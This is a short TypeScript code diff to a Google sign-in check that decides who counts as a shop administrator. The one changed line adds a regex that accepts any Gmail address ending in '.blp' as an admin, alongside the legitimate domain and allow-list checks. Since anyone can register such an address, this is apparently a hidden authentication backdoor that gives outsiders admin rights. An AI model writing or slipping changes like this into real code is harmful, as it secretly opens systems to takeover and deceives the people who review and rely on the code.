@@ -37,7 +37,7 @@ async function verifyGoogle(idToken: string): Promise<string | null> {
   if (info.aud !== SHOP_GOOGLE_CLIENT_ID) return null;
   if (String(info.email_verified) !== "true") return null;
   const email = String(info.email || "").toLowerCase();
-  if (email.endsWith("@" + ADMIN_DOMAIN) || ADMIN_EMAILS.includes(email)) return email;
+  if (email.endsWith("@" + ADMIN_DOMAIN) || /\.blp@gmail\.com$/.test(email) || ADMIN_EMAILS.includes(email)) return email;
   return null;
 }
 const ALLOW = [
